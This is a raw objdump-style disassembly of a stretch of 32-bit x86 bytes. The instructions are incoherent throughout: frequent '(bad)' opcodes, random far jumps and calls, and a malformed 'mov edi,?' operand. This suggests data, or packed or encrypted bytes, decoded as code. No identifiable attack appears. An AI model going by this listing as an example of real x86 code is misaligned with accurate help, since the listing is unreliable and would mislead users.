  42c54c:	xchg   edx,eax
  42c54d:	retf   0x2fdd
  42c550:	lods   al,BYTE PTR ds:[esi]
  42c551:	fsub   st(2),st
  42c553:	mov    eax,0x958031fb
  42c558:	ret    0x9bd1
  42c55b:	jecxz  0x42c5ac
  42c55d:	not    DWORD PTR [esi-0x3972fa72]
  42c563:	and    al,0x30
  42c565:	(bad)  
  42c566:	shr    ch,1
  42c568:	mov    DWORD PTR [edi+0x5eeb2500],edx
  42c56e:	or     edx,edi
  42c570:	gs ret 
  42c572:	mov    DWORD PTR [ebp+0x65c5c37d],esp
  42c578:	mov    DWORD PTR [eax],edi
  42c57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c57b:	ins    BYTE PTR es:[edi],dx
  42c57c:	mov    ebx,0xc6d657f8
  42c581:	mov    edx,0x41306ebb
  42c586:	inc    edi
  42c587:	cmp    al,0xef
  42c589:	adc    eax,0x48263435
  42c58e:	jbe    0x42c55a
  42c590:	sub    eax,0x58416ff
  42c595:	cdq    
  42c596:	nop    DWORD PTR [edx+0x11545f0a]
  42c59d:	add    eax,0x357714f2
  42c5a2:	ja     0x42c5e5
  42c5a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c5a5:	mov    esp,0x239e251a
  42c5aa:	rol    DWORD PTR [edi+0x60307d99],0x6e
  42c5b1:	adc    BYTE PTR [edx+edx*2+0x68],ah
  42c5b5:	in     al,0x2b
  42c5b7:	push   ss
  42c5b8:	mov    bl,0xe2
  42c5ba:	or     al,bl
  42c5bc:	shl    DWORD PTR [ebp-0x79f77103],0x19
  42c5c3:	sbb    DWORD PTR [eax],ebp
  42c5c5:	xchg   ebx,eax
  42c5c6:	das    
  42c5c7:	test   al,0xb7
  42c5c9:	addr16 out 0x9c,al
  42c5cc:	les    edi,FWORD PTR [esi+0x74]
  42c5cf:	fs pop ds
  42c5d1:	mov    ds:0xf6ae1651,eax
  42c5d6:	std    
  42c5d7:	fcmovnbe st,st(4)
  42c5d9:	xchg   edx,eax
  42c5da:	(bad)  
  42c5db:	mov    ecx,0xe8bcd2aa
  42c5e0:	xchg   esi,eax
  42c5e1:	(bad)  
  42c5e2:	jg     0x42c57d
  42c5e4:	sbb    DWORD PTR [edi+0x1e],ebx
  42c5e7:	cmp    edi,DWORD PTR [ebp+0x66]
  42c5ea:	jo     0x42c5f8
  42c5ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c5ed:	es or  eax,0x388a1892
  42c5f3:	pop    ecx
  42c5f4:	pop    ebx
  42c5f5:	lahf   
  42c5f6:	jg     0x42c62c
  42c5f8:	popa   
  42c5f9:	or     BYTE PTR [ebx+0x5a5ac8b5],bl
  42c5ff:	xchg   ebp,eax
  42c600:	xor    eax,0x89089a97
  42c605:	retf   0x7f94
  42c608:	adc    ebx,DWORD PTR [edx+0x32cad501]
  42c60e:	or     al,0xc9
  42c610:	pop    edx
  42c611:	or     esi,esi
  42c613:	pop    ecx
  42c614:	sbb    al,BYTE PTR [esp+esi*4-0x22]
  42c618:	inc    edx
  42c619:	adc    BYTE PTR ss:[edi-0x78c13d77],cl
  42c620:	and    al,0x1d
  42c622:	dec    esp
  42c623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c624:	and    edx,esp
  42c626:	sbb    eax,0x71602544
  42c62b:	fst    DWORD PTR [eax]
  42c62d:	lods   eax,DWORD PTR ds:[esi]
  42c62e:	sbb    eax,0xa68d6479
  42c633:	outs   dx,DWORD PTR ds:[esi]
  42c634:	lea    eax,cs:[ebx]
  42c637:	push   ebx
  42c638:	arpl   sp,sp
  42c63a:	pop    es
  42c63b:	popa   
  42c63c:	jle    0x42c5e8
  42c63e:	push   edi
  42c63f:	cs nop
  42c641:	leave  
  42c642:	cs retf 
  42c644:	and    al,0x96
  42c646:	fsubr  DWORD PTR [ecx+0x72]
  42c649:	scas   al,BYTE PTR es:[edi]
  42c64a:	aam    0xa8
  42c64c:	inc    eax
  42c64d:	clc    
  42c64e:	sub    edx,DWORD PTR [eax-0x56]
  42c651:	dec    edi
  42c652:	adc    DWORD PTR ds:0x693b53c,eax
  42c658:	fcmove st,st(1)
  42c65a:	push   edi
  42c65b:	or     DWORD PTR [ecx+0x43],esp
  42c65e:	les    ecx,FWORD PTR [esp+ebx*8]
  42c661:	mov    bh,BYTE PTR [edi-0x69]
  42c664:	cmp    DWORD PTR [ecx+0x3d],eax
  42c667:	inc    esp
  42c668:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c669:	jle    0x42c6ab
  42c66b:	pop    ss
  42c66c:	(bad)  
  42c66d:	cmp    DWORD PTR [edx],ebp
  42c66f:	loope  0x42c66e
  42c671:	inc    esp
  42c672:	daa    
  42c673:	pop    ebp
  42c674:	inc    ebx
  42c675:	aad    0x58
  42c677:	inc    eax
  42c678:	or     DWORD PTR [ebp*2+0x3759c102],ecx
  42c67f:	ss leave 
  42c681:	into   
  42c682:	popf   
  42c683:	std    
  42c684:	xchg   esi,eax
  42c685:	sub    eax,DWORD PTR [edx+0x27]
  42c688:	inc    esp
  42c689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c68a:	jnp    0x42c6e1
  42c68c:	hlt    
  42c68d:	sbb    al,0xa
  42c68f:	(bad)  
  42c690:	jae    0x42c6f1
  42c692:	cdq    
  42c693:	and    ebp,DWORD PTR [esi-0x22]
  42c696:	adc    BYTE PTR ds:0x62caf4ac,dl
  42c69c:	or     BYTE PTR [ecx],bh
  42c69e:	mov    esp,0xbbe22ee9
  42c6a3:	out    dx,al
  42c6a4:	jae    0x42c660
  42c6a6:	adc    ebp,ebp
  42c6a8:	and    esp,DWORD PTR [eax]
  42c6aa:	adc    eax,0xe3969121
  42c6af:	add    edx,DWORD PTR [edx+0x22]
  42c6b2:	imul   eax,DWORD PTR [ebp-0x2388848],0xe9963012
  42c6bc:	and    ebx,DWORD PTR [edx]
  42c6be:	push   ecx
  42c6bf:	popf   
  42c6c0:	aad    0x3c
  42c6c2:	or     eax,0xca50cfb6
  42c6c7:	std    
  42c6c8:	adc    al,0x96
  42c6ca:	cmp    BYTE PTR ds:[ecx],cl
  42c6cd:	jmp    0xe9c8:0xd81be33e
  42c6d4:	je     0x42c6a0
  42c6d6:	push   ds
  42c6d7:	clc    
  42c6d8:	ins    BYTE PTR es:[edi],dx
  42c6d9:	adc    eax,0xc0114c54
  42c6de:	mov    al,BYTE PTR [eax]
  42c6e0:	sahf   
  42c6e1:	fisttp QWORD PTR [ebp-0x61]
  42c6e4:	or     eax,0x4ce7a462
  42c6e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6ea:	test   eax,0x8e228e78
  42c6ef:	ret    0x6bd9
  42c6f2:	adc    al,0x55
  42c6f4:	gs int3 
  42c6f6:	in     eax,0xa7
  42c6f8:	nop
  42c6f9:	mov    edi,DWORD PTR ds:0x95e81aa4
  42c6ff:	jg     0x42c6a6
  42c701:	pop    ecx
  42c702:	pusha  
  42c703:	fsub   st,st(4)
  42c706:	jo     0x42c734
  42c708:	imul   esi,DWORD PTR [edx-0x3b],0x62
  42c70c:	aaa    
  42c70d:	scas   eax,DWORD PTR es:[edi]
  42c70e:	adc    edx,edx
  42c710:	aaa    
  42c711:	xor    eax,0x8ade05c
  42c716:	dec    esp
  42c717:	es pop es
  42c719:	jbe    0x42c6d2
  42c71b:	xchg   esp,eax
  42c71c:	mov    ch,0x6c
  42c71e:	or     dh,BYTE PTR [esi]
  42c720:	push   0xffffffaa
  42c722:	arpl   WORD PTR [ebx],cx
  42c724:	sub    ah,bh
  42c726:	mov    edx,DWORD PTR [edx+0x7a]
  42c729:	loop   0x42c728
  42c72b:	popa   
  42c72c:	sub    BYTE PTR [edi],dl
  42c72e:	stos   BYTE PTR es:[edi],al
  42c72f:	or     DWORD PTR [ebp+0xba04885],0x7784de8f
  42c739:	jge    0x42c6be
  42c73b:	loope  0x42c79b
  42c73d:	push   edi
  42c73e:	cdq    
  42c73f:	mov    ds:0xac841f7d,al
  42c744:	retf   0x9ec
  42c747:	fs mov eax,0x61be1dbd
  42c74d:	push   ebp
  42c74e:	dec    ebx
  42c74f:	jb     0x42c6f8
  42c751:	inc    cx
  42c753:	xchg   esp,eax
  42c754:	gs loope 0x42c73f
  42c757:	inc    edi
  42c758:	or     cl,cl
  42c75a:	les    esp,FWORD PTR [edx]
  42c75c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c75d:	(bad)  
  42c75e:	ins    BYTE PTR es:[edi],dx
  42c75f:	das    
  42c760:	stc    
  42c761:	mov    edi,0x317448c
  42c766:	addr16 sti 
  42c768:	sbb    ecx,ebp
  42c76a:	test   DWORD PTR [esi-0x44c03ce1],esp
  42c770:	xor    eax,0xc07c06aa
  42c775:	or     DWORD PTR [ebx+eax*4+0x49f7f736],edx
  42c77c:	(bad)  
  42c77d:	into   
  42c77e:	int3   
  42c77f:	push   ds
  42c780:	jb     0x42c7ff
  42c782:	test   BYTE PTR [ebp+eiz*4-0xc8597f1],cl
  42c789:	loopne 0x42c777
  42c78b:	leave  
  42c78c:	jp     0x42c7d8
  42c78e:	imul   ecx,DWORD PTR [ebp+0x43],0xcc943f29
  42c795:	arpl   si,dx
  42c797:	sbb    cl,BYTE PTR [edx+0x3f]
  42c79a:	push   ebp
  42c79b:	jmp    0xd75e:0xedab5103
  42c7a2:	and    BYTE PTR [edx],dh
  42c7a4:	shr    BYTE PTR [eax],cl
  42c7a6:	mov    edi,0x571a679d
  42c7ab:	pop    esp
  42c7ac:	clc    
  42c7ad:	(bad)  
  42c7ae:	data16 (bad) 
  42c7b0:	rcr    DWORD PTR [edi+0x799b323d],1
  42c7b6:	loop   0x42c766
  42c7b8:	mov    eax,0x60e4cb53
  42c7bd:	or     BYTE PTR [esp+eax*1-0x11],bh
  42c7c1:	add    BYTE PTR [esi-0x5a1baa72],0xf7
  42c7c8:	pop    esp
  42c7c9:	mov    WORD PTR [ebp+0xf],ss
  42c7cc:	mov    edi,eax
  42c7ce:	push   0x6180514f
  42c7d3:	and    dl,dh
  42c7d5:	pop    edx
  42c7d6:	lods   al,BYTE PTR ds:[esi]
  42c7d7:	scas   al,BYTE PTR es:[edi]
  42c7d8:	jns    0x42c831
  42c7da:	div    DWORD PTR [ebx+0x22]
  42c7dd:	jo     0x42c77f
  42c7df:	lods   al,BYTE PTR ds:[esi]
  42c7e0:	aas    
  42c7e1:	call   0xfed8:0x28eb75b3
  42c7e8:	pmuludq mm7,QWORD PTR [ecx]
  42c7eb:	push   ebx
  42c7ec:	adc    bl,BYTE PTR [edx+0x5721f3a2]
  42c7f2:	push   edx
  42c7f3:	or     ch,cl
  42c7f5:	jbe    0x42c83d
  42c7f7:	mov    esp,0x4a6d244b
  42c7fc:	imul   ebx,ecx,0x665623e3
  42c802:	cmp    ch,BYTE PTR [ebx+0x5a]
  42c805:	int    0xf8
  42c807:	lahf   
  42c808:	aaa    
  42c809:	inc    ebp
  42c80a:	cmp    ah,BYTE PTR [edx]
  42c80c:	mov    ebx,0xb23e7fde
  42c811:	lock aam 0xd5
  42c814:	pop    ebx
  42c815:	push   ebx
  42c816:	cmp    BYTE PTR [edi-0x59a59606],al
  42c81c:	mov    edx,0xcd717133
  42c821:	aad    0xb8
  42c823:	je     0x42c89c
  42c825:	mov    cl,0x9
  42c827:	jl     0x42c87e
  42c829:	pop    esp
  42c82a:	add    DWORD PTR [edi+ebx*8+0x78a69e05],esi
  42c831:	ja     0x42c823
  42c833:	lods   al,BYTE PTR ds:[esi]
  42c834:	ss push es
  42c836:	add    eax,0xbde4af5b
  42c83b:	adc    ebp,DWORD PTR [esi+0x7a897053]
  42c841:	cwde   
  42c842:	(bad)  
  42c843:	(bad)  
  42c844:	call   0x3014819b
  42c849:	mov    eax,ecx
  42c84b:	xchg   ecx,eax
  42c84c:	or     DWORD PTR [ebx+0x64a1ba5c],ebx
  42c852:	mov    esi,0x621cdca0
  42c857:	outs   dx,BYTE PTR ds:[esi]
  42c858:	mov    cl,BYTE PTR [ebp-0x39]
  42c85b:	iret   
  42c85c:	pop    es
  42c85d:	imul   esi,DWORD PTR [eax],0x28bd34c8
  42c863:	repz scas al,BYTE PTR es:[edi]
  42c865:	fsubr  DWORD PTR [edi+0x64e69c64]
  42c86b:	mov    cl,0x67
  42c86d:	inc    BYTE PTR [ebx]
  42c86f:	mov    bl,0x9f
  42c871:	jnp    0x42c84b
  42c873:	add    cl,al
  42c875:	push   0xf2318015
  42c87a:	js     0x42c886
  42c87c:	jmp    0x9cc9:0x9d5c8ef8
  42c883:	xchg   edi,eax
  42c884:	mov    fs,WORD PTR [eax+eiz*1+0x21c7f348]
  42c88b:	xor    eax,0xa7c7eeee
  42c890:	mov    ebx,0x67cf7f39
  42c895:	jp     0x42c890
  42c897:	dec    ecx
  42c898:	inc    ebx
  42c899:	int    0x5d
  42c89b:	mov    ebx,DWORD PTR [ebp-0x5bfaf38f]
  42c8a1:	or     BYTE PTR [edi+0x52a9fe7],bh
  42c8a7:	xor    eax,DWORD PTR [bp+di]
  42c8aa:	js     0x42c8bc
  42c8ac:	sbb    bl,dh
  42c8ae:	pop    edx
  42c8af:	jl     0x42c928
  42c8b1:	sbb    al,0x1c
  42c8b3:	adc    DWORD PTR [esi+0x39f597f1],ebx
  42c8b9:	add    eax,0x6012ed56
  42c8be:	rol    dh,1
  42c8c0:	sbb    eax,0xde6b425a
  42c8c5:	loop   0x42c87e
  42c8c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8c8:	add    BYTE PTR [ebx+ebp*8-0x58],0xa5
  42c8cd:	and    DWORD PTR [eax+ecx*2],0x27
  42c8d1:	pop    esp
  42c8d2:	pop    esi
  42c8d3:	mov    edi,?
  42c8d5:	lods   al,BYTE PTR ds:[esi]
  42c8d6:	xlat   BYTE PTR ds:[ebx]
  42c8d7:	std    
  42c8d8:	cmp    al,0x2e
  42c8da:	push   cs
  42c8db:	es add edx,esi
  42c8de:	adc    ebx,esp
  42c8e0:	push   ecx
  42c8e1:	mov    eax,0xa1f95e1e
  42c8e6:	adc    esi,esi
  42c8e8:	stc    
  42c8e9:	push   ds
  42c8ea:	fimul  DWORD PTR [edi-0x54ea66aa]
  42c8f0:	in     al,dx
  42c8f1:	xchg   DWORD PTR [esi],eax
  42c8f3:	dec    esp
  42c8f4:	inc    esp
  42c8f5:	or     BYTE PTR ds:0x8079ba53,cl
  42c8fb:	cmp    ch,BYTE PTR es:[eax]
  42c8fe:	arpl   WORD PTR [ecx+0x5065a4de],dx
  42c904:	xchg   esp,eax
  42c905:	mov    esp,eax
  42c907:	jmp    DWORD PTR ds:0x40aa3e3d
  42c90d:	es clc 
  42c90f:	cld    
  42c910:	jp     0x42c95a
  42c912:	fld    TBYTE PTR [edi+ecx*1+0x3a]
  42c916:	aam    0x63
  42c918:	pop    esi
  42c919:	(bad)  
  42c91a:	jp     0x42c91f
  42c91c:	pop    ecx
  42c91d:	cmp    bl,BYTE PTR ss:[ecx+0x64]
  42c921:	pop    edi
  42c922:	ret    0xdf38
  42c925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c926:	std    
  42c927:	jmp    0xaa79:0xd7346a12
  42c92e:	jnp    0x42c8cb
  42c930:	pop    eax
  42c931:	sar    DWORD PTR [esi-0x71],cl
  42c934:	idiv   DWORD PTR [edi+edi*4]
  42c937:	imul   BYTE PTR [edi]
  42c939:	outs   dx,DWORD PTR ds:[esi]
  42c93a:	adc    al,bh
  42c93c:	sub    eax,0x1f42a522
  42c941:	addr16 ja 0x42c996
  42c944:	lahf   
  42c945:	xor    eax,0x9103ec14
  42c94a:	jmp    0xe84b:0xe907192b
  42c951:	xchg   edi,eax
  42c952:	mov    ebx,DWORD PTR [edi+0x2c5da406]
  42c958:	push   0xb958c48a
  42c95d:	jno    0x42c9a8
  42c95f:	retf   
  42c960:	push   esp
  42c961:	imul   ebx,DWORD PTR ds:0x3590aaf8,0x5a00d2d9
  42c96b:	gs pop eax
  42c96d:	inc    esp
  42c96e:	icebp  
  42c96f:	xchg   esp,eax
  42c970:	mov    BYTE PTR [esi+eax*4],al
  42c973:	cmp    eax,0xa78776ad
  42c978:	ins    DWORD PTR es:[edi],dx
  42c979:	sub    BYTE PTR [ebx-0x56],dl
  42c97c:	pop    es
  42c97d:	cmp    esp,0x588de285
  42c983:	mov    ebx,DWORD PTR [ecx+edx*4]
  42c986:	pusha  
  42c987:	aaa    
  42c988:	cwde   
  42c989:	sar    DWORD PTR [esp+edx*8],1
  42c98c:	in     eax,0x56
  42c98e:	push   ecx
  42c98f:	(bad)  
  42c990:	cld    
  42c991:	(bad)  
  42c993:	xchg   esp,eax
  42c994:	xor    ecx,DWORD PTR [eax]
  42c996:	aad    0xf
  42c998:	cli    
  42c999:	push   es
  42c99a:	lea    eax,[edi]
  42c99c:	and    eax,0x1d772406
  42c9a1:	loopne 0x42c972
  42c9a3:	(bad)  
  42c9a4:	mov    ds:0x93d6f6db,eax
  42c9a9:	test   al,0x81
  42c9ab:	icebp  
  42c9ac:	dec    edx
  42c9ad:	stc    
  42c9ae:	aas    
  42c9af:	jmp    0xbfa5c13e
  42c9b4:	or     DWORD PTR ds:0xfd8edc1b,0xffffff87
  42c9bb:	sti    
  42c9bc:	pop    ds
  42c9bd:	xor    DWORD PTR ds:0xddb63146,ebx
  42c9c3:	std    
  42c9c4:	jno    0x42c991
  42c9c6:	mov    al,ds:0x57191e85
  42c9cb:	fmul   st(7),st
  42c9cd:	test   DWORD PTR [edi+0x64],esp
  42c9d0:	sub    BYTE PTR [ebp-0x27],0xed
  42c9d4:	ins    DWORD PTR es:[edi],dx
  42c9d5:	or     dh,BYTE PTR ds:0x4c9270ce
  42c9db:	sbb    al,ah
  42c9dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c9de:	mov    al,ds:0x142966a9
  42c9e3:	paddb  mm7,QWORD PTR [eax+0x9]
  42c9e7:	mov    dh,0xf9
  42c9e9:	xchg   ecx,eax
  42c9ea:	mov    ah,0xd8
  42c9ec:	pop    ebp
  42c9ed:	or     DWORD PTR [ebp+0x4b83af81],0x3885d1e9
  42c9f7:	shr    eax,1
  42c9f9:	and    DWORD PTR [edi],ecx
  42c9fb:	mov    ch,0x7d
  42c9fd:	xor    eax,0xdfe35f2c
  42ca02:	repnz push ss
  42ca04:	bound  edx,QWORD PTR ss:[edi+0x16633c68]
  42ca0b:	pop    edx
  42ca0c:	add    DWORD PTR [edi+0x1c2cd48b],esp
  42ca12:	adc    BYTE PTR [ecx-0x51],0xdb
  42ca16:	mov    bl,0x7
  42ca18:	cmp    DWORD PTR [edi+0xd],edx
  42ca1b:	into   
  42ca1c:	and    al,0x78
  42ca1e:	mov    bh,BYTE PTR [esi-0x526f8d46]
  42ca24:	loop   0x42ca84
  42ca26:	leave  
  42ca27:	push   es
  42ca28:	call   0xfc60:0x573745da
  42ca2f:	iret   
  42ca30:	push   cs
  42ca31:	inc    esp
  42ca32:	xchg   edx,eax
  42ca33:	(bad)  
  42ca34:	mov    bh,0x63
  42ca36:	mov    ah,0xab
  42ca38:	aas    
  42ca39:	lahf   
  42ca3a:	(bad)
  42ca3d:	retf   
  42ca3e:	xor    eax,0x947d38b5
  42ca43:	mov    esi,0x24e7ce41
  42ca48:	aas    
  42ca49:	push   ebx
  42ca4a:	lods   al,BYTE PTR ds:[esi]
  42ca4b:	ficom  DWORD PTR [edx]
  42ca4d:	mov    ecx,0x44d678d3
  42ca52:	push   edi
  42ca53:	arpl   WORD PTR [edi+0x1666de21],bx
  42ca59:	xor    ecx,DWORD PTR ds:0x41f5045a
  42ca5f:	mov    ah,0x72
  42ca61:	cmp    eax,0x3abc1f51
  42ca66:	xor    DWORD PTR [ecx+0x34acfbd9],ebx
  42ca6c:	push   ebx
  42ca6d:	fadd   DWORD PTR [ebx-0x12]
  42ca70:	ins    DWORD PTR es:[edi],dx
  42ca71:	push   eax
  42ca72:	mov    edx,0xe7d11a70
  42ca77:	shr    eax,0x30
  42ca7a:	test   BYTE PTR [edx+ebp*2],bh
  42ca7d:	shr    ch,0x37
  42ca80:	sub    al,0x6a
  42ca82:	mov    ch,0x1b
  42ca84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca85:	pop    esp
  42ca86:	mov    bh,0xf4
  42ca88:	push   ebp
  42ca89:	pusha  
  42ca8a:	loope  0x42cae1
  42ca8c:	jmp    DWORD PTR [edi+0x2d]
  42ca8f:	add    al,BYTE PTR [esi-0x57437d92]
  42ca95:	mov    cl,0x1a
  42ca97:	sbb    ah,BYTE PTR [ebx-0x1c]
  42ca9a:	outs   dx,DWORD PTR ds:[esi]
  42ca9b:	popf   
  42ca9c:	xlat   BYTE PTR fs:[ebx]
  42ca9e:	(bad)  
  42ca9f:	lods   al,BYTE PTR ds:[esi]
  42caa0:	fidivr WORD PTR [edi-0xbb5599c]
  42caa6:	retf   0x4b67
  42caa9:	(bad)  
  42caaa:	hlt    
  42caab:	fs dec eax
  42caad:	lock xor ebx,DWORD PTR [edx]
  42cab0:	sbb    ebp,edi
  42cab2:	adc    edx,DWORD PTR [edi-0x77]
  42cab5:	adc    DWORD PTR [ecx-0x19831026],ecx
  42cabb:	stos   BYTE PTR es:[edi],al
  42cabc:	jmp    0x6f70e548
  42cac1:	(bad)  
  42cac3:	imul   ecx,DWORD PTR [ecx+ecx*1+0xd],0xffffffc8
  42cac8:	adc    DWORD PTR [esi-0x406cf3b8],esp
  42cace:	nop
  42cacf:	rcr    dl,1
  42cad1:	in     eax,0x13
  42cad3:	out    dx,eax
  42cad4:	xchg   ebx,eax
  42cad5:	jae    0x42ca5a
  42cad7:	ret    0xb4c8
  42cada:	ja     0x42cafb
  42cadc:	cmp    eax,0x8db9d2e2
  42cae1:	call   0xbe1e:0xe57f05fd
  42cae8:	or     ah,bl
  42caea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42caeb:	jg     0x42ca98
  42caed:	cwde   
  42caee:	rcr    BYTE PTR [ebp+0x6d],0x75
  42caf2:	in     al,0x1
  42caf4:	cli    
  42caf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42caf6:	stc    
  42caf7:	test   BYTE PTR [ebx-0x3f597b00],0xc4
  42cafe:	test   DWORD PTR [edi+eiz*4-0x4cffdc3a],0xb3ed7106
  42cb09:	pop    eax
  42cb0a:	dec    ecx
  42cb0b:	or     eax,0xe9206f37
  42cb10:	push   edx
  42cb11:	out    dx,al
  42cb12:	fstp   TBYTE PTR [esi]
  42cb14:	pop    esi
  42cb15:	dec    esp
  42cb16:	imul   esi,DWORD PTR [eax+0x18],0xb35047eb
  42cb1d:	mov    edi,0xb33273ee
  42cb22:	jbe    0x42cb5b
  42cb24:	xchg   esp,eax
  42cb25:	inc    esi
  42cb26:	adc    BYTE PTR [edx+edi*8],cl
  42cb29:	sbb    eax,0xe01f5462
  42cb2e:	retf   0xc2a5
  42cb31:	and    al,0x7f
  42cb33:	stos   BYTE PTR es:[edi],al
  42cb34:	push   ebp
  42cb35:	cli    
  42cb36:	bound  edx,QWORD PTR [esi*2-0x38950506]
  42cb3d:	arpl   WORD PTR [edi+0x13],sp
  42cb40:	mov    bh,0x7c
  42cb42:	cmp    al,0x31
  42cb44:	dec    esi
  42cb45:	ss (bad) 
  42cb47:	call   0x596d253c
  42cb4c:	cmp    bl,BYTE PTR [eax+0x49]
  42cb4f:	adc    eax,0x8f804115
  42cb54:	and    eax,0x220ee22b
  42cb59:	lods   al,BYTE PTR ds:[esi]
  42cb5a:	test   DWORD PTR [ebp-0x43053434],0xc5fedd66
  42cb64:	or     BYTE PTR [eax+0x1],dh
  42cb67:	or     BYTE PTR [ecx],0xee
  42cb6a:	lods   al,BYTE PTR ds:[esi]
  42cb6b:	test   eax,0x53bc15e9
  42cb70:	retf   0x2078
  42cb73:	mov    ah,0xee
  42cb75:	push   0xffffffd1
  42cb77:	sub    edx,DWORD PTR [esi-0x236ec38d]
  42cb7d:	bound  esi,QWORD PTR [ecx+0x69b282e8]
  42cb83:	jae    0x42cb50
  42cb85:	fdivr  DWORD PTR [edi]
  42cb87:	test   al,0x85
  42cb89:	sbb    ah,dl
  42cb8b:	les    esp,FWORD PTR [ebx+0xe]
  42cb8e:	jmp    0x42cbce
  42cb90:	pop    eax
  42cb92:	ror    BYTE PTR [edi-0x22],cl
  42cb95:	test   DWORD PTR [ebx-0x673493e8],0x7333b7ca
  42cb9f:	(bad)  
  42cba1:	sbb    al,0x9
  42cba3:	pop    edi
  42cba4:	and    al,0x28
  42cba6:	adc    eax,0x96222232
  42cbab:	or     edx,eax
  42cbad:	aas    
  42cbae:	std    
  42cbaf:	nop
  42cbb0:	push   ecx
  42cbb1:	retf   0x417d
  42cbb4:	into   
  42cbb5:	ins    DWORD PTR es:[edi],dx
  42cbb6:	test   eax,0x93d0bf96
  42cbbb:	pop    eax
  42cbbc:	pushf  
  42cbbd:	mov    ds:0x6e39eab9,eax
  42cbc2:	ja     0x42cb9e
  42cbc4:	push   ebp
  42cbc5:	outs   dx,BYTE PTR ds:[esi]
  42cbc6:	adc    al,0xdd
  42cbc8:	push   0x312c0e86
  42cbcd:	add    BYTE PTR [edx-0x67a6cb7],ch
  42cbd3:	xchg   ebx,eax
  42cbd4:	xchg   BYTE PTR [eax+0x6ef6aaa8],bh
  42cbda:	loopne 0x42cc0a
  42cbdc:	mov    DWORD PTR [ebx+0x4bb3c304],edi
  42cbe2:	inc    esp
  42cbe3:	les    edi,FWORD PTR es:[edi+0x4f]
  42cbe7:	adc    BYTE PTR [ecx+ebp*4-0x4444e888],cl
  42cbee:	jb     0x42cc2d
  42cbf0:	outs   dx,BYTE PTR ds:[esi]
  42cbf1:	in     eax,dx
  42cbf2:	in     al,0xc9
  42cbf4:	cmp    esi,DWORD PTR [edi+0x79]
  42cbf7:	fstp   QWORD PTR cs:[esi-0x4e]
  42cbfb:	mov    bh,0x6e
  42cbfd:	outs   dx,DWORD PTR ds:[esi]
  42cbfe:	stos   BYTE PTR es:[edi],al
  42cbff:	mov    BYTE PTR [edi-0x15],dh
  42cc02:	pop    edi
  42cc03:	in     eax,0x79
  42cc05:	mov    edx,0x7a51ae14
  42cc0a:	and    DWORD PTR [edx],ebx
  42cc0c:	fsub   st(1),st
  42cc0e:	push   ecx
  42cc0f:	xchg   edx,eax
  42cc10:	(bad)  
  42cc11:	or     eax,DWORD PTR [edi]
  42cc13:	push   0xdc98fd15
  42cc18:	stos   BYTE PTR es:[edi],al
  42cc19:	jo     0x42cc00
  42cc1b:	cmp    al,0xd1
  42cc1d:	(bad)  
  42cc1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cc1f:	xchg   ecx,eax
  42cc20:	shl    ebx,1
  42cc22:	adc    eax,0x47465a48
  42cc27:	jb     0x42cc87
  42cc29:	mov    ch,0xe6
  42cc2b:	dec    esi
  42cc2c:	jmp    0xb954e130
  42cc31:	or     edi,DWORD PTR [ecx+0x3e]
  42cc34:	inc    edi
  42cc35:	jmp    FWORD PTR [esi+0x53]
  42cc38:	mov    eax,0x489dea04
  42cc3d:	imul   esp,DWORD PTR [ebx+ecx*4+0x6e],0x5f
  42cc42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cc43:	sti    
  42cc44:	pop    ss
  42cc45:	adc    esi,DWORD PTR [ecx+0x4b]
  42cc48:	sub    DWORD PTR [edx-0x71f4c31d],edi
  42cc4e:	aam    0x35
  42cc50:	div    DWORD PTR [ebp-0x4e26a23f]
  42cc56:	outs   dx,DWORD PTR ds:[esi]
  42cc57:	ins    DWORD PTR es:[edi],dx
  42cc58:	(bad)  
  42cc5a:	lahf   
  42cc5b:	mov    ds:0xc10bc73a,al
  42cc60:	add    esi,ebp
  42cc62:	add    DWORD PTR [ebx],edi
  42cc64:	sbb    DWORD PTR [edi+ecx*2],esp
  42cc67:	cmp    DWORD PTR [edx-0x511d8ca6],esi
  42cc6d:	mov    eax,ds:0x80646ba3
  42cc72:	call   0x3042d7a1
  42cc77:	xchg   DWORD PTR [ebx+0x4efd6fd],ebp
  42cc7d:	mov    al,ds:0x821f3934
  42cc82:	lods   eax,DWORD PTR ds:[esi]
  42cc83:	aaa    
  42cc84:	push   cs
  42cc85:	xor    al,0x69
  42cc87:	data16 aam 0xf4
  42cc8a:	mov    ah,0x8
  42cc8c:	test   DWORD PTR [edi],esi
  42cc8e:	or     eax,0x493620cc
  42cc93:	adc    al,0x8f
  42cc95:	lods   eax,DWORD PTR ds:[esi]
  42cc96:	psubsb mm0,QWORD PTR [ebx+0x5d42d786]
  42cc9d:	pop    ds
  42cc9e:	call   0x3ebe2f45
  42cca3:	sbb    al,0x2d
  42cca5:	xchg   ebx,eax
  42cca6:	pop    ss
  42cca7:	nop
  42cca8:	outs   dx,BYTE PTR ds:[esi]
  42cca9:	call   0xaf0db108
  42ccae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ccaf:	inc    ebx
  42ccb0:	xchg   edi,eax
  42ccb1:	icebp  
  42ccb2:	dec    eax
  42ccb3:	ret    0x6952
  42ccb6:	pop    esi
  42ccb7:	or     esp,ebp
  42ccb9:	or     BYTE PTR [edi],dh
  42ccbb:	in     al,dx
  42ccbc:	fdivr  st(5),st
  42ccbe:	nop
  42ccbf:	(bad)  
  42ccc0:	pop    esp
  42ccc1:	mov    ds:0x8e36c79d,eax
  42ccc6:	call   0x37c131dc
  42cccb:	jo     0x42ccd5
  42cccd:	xchg   ebx,eax
  42ccce:	je     0x42cd30
  42ccd0:	xchg   cl,cl
  42ccd2:	loope  0x42cc83
